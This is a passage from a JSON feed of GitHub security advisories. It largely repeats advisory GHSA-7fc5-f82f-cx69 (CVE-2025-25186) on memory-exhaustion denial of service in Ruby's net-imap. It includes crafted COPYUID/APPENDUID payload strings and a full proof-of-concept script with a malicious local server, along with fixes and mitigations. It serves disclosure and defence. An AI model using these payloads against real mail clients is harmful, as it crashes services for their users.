server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)\nError in client: failed to allocate memory (NoMemoryError)\n/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'\n        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'\n        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'\n        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'\n        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'\n        from /workspace/poc.rb:70:in '&lt;main&gt;'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69\">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>\n<li><a href=\"https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35\">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25186\">https://nvd.nist.gov/vuln/detail/CVE-2025-25186</a></li>\n<li><a href=\"https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3\">https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3</a></li>\n<li><a href=\"https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022\">https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022</a></li>\n<li><a href=\"https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html\">https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html</a></li>\n<li><a href=\"https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html\">https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html</a></li>\n<li><a href=\"https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html\">https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7fc5-f82f-cx69\">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7fc5-f82f-cx69",
            "title": "[net-imap] Possible DoS by memory exhaustion in net-imap",
            "date_modified": "2025-02-11T21:39:41.000Z",
            "date_published": "2025-02-10T17:42:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7fc5-f82f-cx69"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>\n<h3 id=\"details\">Details</h3>\n<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>\"1,2,3,4,5\"</code> and <code>\"1:5\"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>\n<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>\n<p>Malicious inputs:</p>\n<pre><code class=\"language-ruby\"># 40 bytes expands to ~1.6GB:\n\"* OK [COPYUID 1 1:99999999 1:99999999]\\r\\n\"\n\n# Worst *valid* input scenario (using uint32 max),\n# 44 bytes expands to 64GiB:\n\"* OK [COPYUID 1 1:4294967295 1:4294967295]\\r\\n\"\n\n# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than\n# UINT32_MAX can be created.  For example, the following would theoretically\n# expand to almost 800 exabytes:\n\"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\\r\\n\"\n</code></pre>\n<p>Simple way to test this:</p>\n<pre><code class=\"language-ruby\">require \"net/imap\"\n\ndef test(size)\n  input = \"A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\\r\\n\"\n  parser = Net::IMAP::ResponseParser.new\n  parser.parse input\nend\n\ntest(99_999_999)\n</code></pre>\n<h3 id=\"fixes\">Fixes</h3>\n<h4 id=\"preferred-fix-minor-api-changes\">Preferred Fix, minor API changes</h4>\n<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>\n<pre><code class=\"language-ruby\"># globally\nNet::IMAP.config.parser_use_deprecated_uidplus_data = false\n# per-client\nimap = Net::IMAP.new(hostname, ssl: true,\n                               parser_use_deprecated_uidplus_data: false)\nimap.config.parser_use_deprecated_uidplus_data = false\n</code></pre>\n<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href=\"https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html\">UIDPlusData</a>, <a href=\"https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html\">AppendUIDData</a> and <a href=\"https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html\">CopyUIDData</a>.</p>\n<p>For v0.3.8, this option is not available.\nFor v0.4.19, the default value is <code>true</code>.\nFor v0.5.6, the default value is <code>:up_to_max_size</code>.\nFor v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>\n<h4 id=\"mitigation-backward-compatible-api\">Mitigation, backward compatible API</h4>\n<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>\n<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>\n<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.\nWhen <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will raise <code>Net::IMAP::ResponseParseError</code>.\nWhen  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>\n<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.\nFor v0.4.19, the limit defaults to 1000.\nFor v0.5.6, the limit defaults to 100.\nFor v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>\n<h4 id=\"please-note-unhandled-responses\">Please Note: unhandled responses</h4>\n<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>\n<pre><code class=\"language-ruby\">limit = 1000\nimap.add_response_handler do |resp|\n  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)\n  name = resp.name\n  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)\n  if Net::IMAP::VERSION &gt; \"0.4.0\"\n    imap.responses(name) { _1.slice!(0...-limit) }\n    imap.responses(code) { _1.slice!(0...-limit) }\n  else\n    imap.responses(name).slice!(0...-limit)\n    imap.responses(code).slice!(0...-limit)\n  end\nend\n</code></pre>\n<h3 id=\"proof-of-concept\">Proof of concept</h3>\n<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>\n<pre><code class=\"language-ruby\">#!/usr/bin/env ruby\nrequire 'socket'\nrequire 'net/imap'\n\nif !defined?(Net::IMAP.config)\n  puts \"Net::IMAP.config is not available\"\nelsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)\n  puts \"Net::IMAP.config.parser_use_deprecated_uidplus_data is not available\"\nelse\n  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size\n  puts \"Updated parser_use_deprecated_uidplus_data to :up_to_max_size\"\nend\n\nsize = Integer(ENV[\"UID_SET_SIZE\"] || 2**32-1)\n\ndef server_addr\n  Addrinfo.tcp(\"localhost\", 0).ip_address\nend\n\ndef create_tcp_server\n  TCPServer.new(server_addr, 0)\nend\n\ndef start_server\n  th = Thread.new do\n    yield\n  end\n  sleep 0.1 until th.stop?\nend\n\ndef copyuid_response(tag: \"*\", size: 2**32-1, text: \"too large?\")\n  \"#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\\r\\n\"\nend\n\ndef appenduid_response(tag: \"*\", size: 2**32-1, text: \"too large?\")\n  \"#{tag} OK [APPENDUID 1 1:#{size}] #{text}\\r\\n\"\nend\n\nserver = create_tcp_server\nport = server.addr[1]\nputs \"Server started on port #{port}\"\n\n# server\nstart_server do\n  sock = server.accept\n  begin\n    sock.print \"* OK test server\\r\\n\"\n    cmd = sock.gets(\"\\r\\n\", chomp: true)\n    tag = cmd.match(/\\A(\\w+) /)[1]\n    puts \"Received: #{cmd}\"\n\n    malicious_response = appenduid_response(size:)\n    puts \"Sending: #{malicious_response.chomp}\"\n    sock.print malicious_response\n\n    malicious_response = copyuid_response(size:)\n    puts \"Sending: #{malicious_response.chomp}\"\n    sock.print malicious_response\n    sock.print \"* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\\r\\n\"\n    sock.print \"#{tag} OK CAPABILITY completed\\r\\n\"\n\n    cmd = sock.gets(\"\\r\\n\", chomp: true)\n    tag = cmd.match(/\\A(\\w+) /)[1]\n    puts \"Received: #{cmd}\"\n    sock.print \"* BYE If you made it this far, you passed the test!\\r\\n\"\n    sock.print \"#{tag} OK LOGOUT completed\\r\\n\"\n  rescue Exception =&gt; ex\n    puts \"Error in server: #{ex.message} (#{ex.class})\"\n  ensure\n    sock.close\n    server.close\n  end\nend\n\n# client\nbegin\n  puts \"Client connecting,..\"\n  imap = Net::IMAP.new(server_addr, port: port)\n  puts \"Received capabilities: #{imap.capability}\"\n  pp responses: imap.responses\n  imap.logout\nrescue Exception =&gt; ex\n  puts \"Error in client: #{ex.message} (#{ex.class})\"\n  puts ex.full_message\nensure\n  imap.disconnect if imap\nend\n</code></pre>\n<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>\n<pre><code class=\"language-console\">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )\nServer started on port 34291\nClient connecting,..\nReceived: RUBY0001 CAPABILITY\nSending: * OK [APPENDUID 1 1:4294967295] too large?\nSending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?\nError in server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)\nError in client: failed to allocate memory (NoMemoryError)\n/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'\n        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'\n        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'\n        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'\n        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'\n        from /workspace/poc.rb:70:in '&lt;main&gt;'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69\">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>\n<li><a href=\"https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35\">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25186\">https://nvd.nist.gov/vuln/detail/CVE-2025-25186</a></li>\n<li><a href=\"https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3\">https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3</a></li>\n<li><a href=\"https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022\">https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022</a></li>\n<li><a href=\"https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html\">https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html</a></li>\n<li><a href=\"https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html\">https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html</a></li>\n<li><a href=\"https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html\">https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7fc5-f82f-cx69\">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7fc5-f82f-cx69",
            "title": "[net-imap] Possible DoS by memory exhaustion in net-imap",
            "date_modified": "2025-02-11T21:39:41.000Z",
            "date_published": "2025-02-10T17:42:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7fc5-f82f-cx69"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}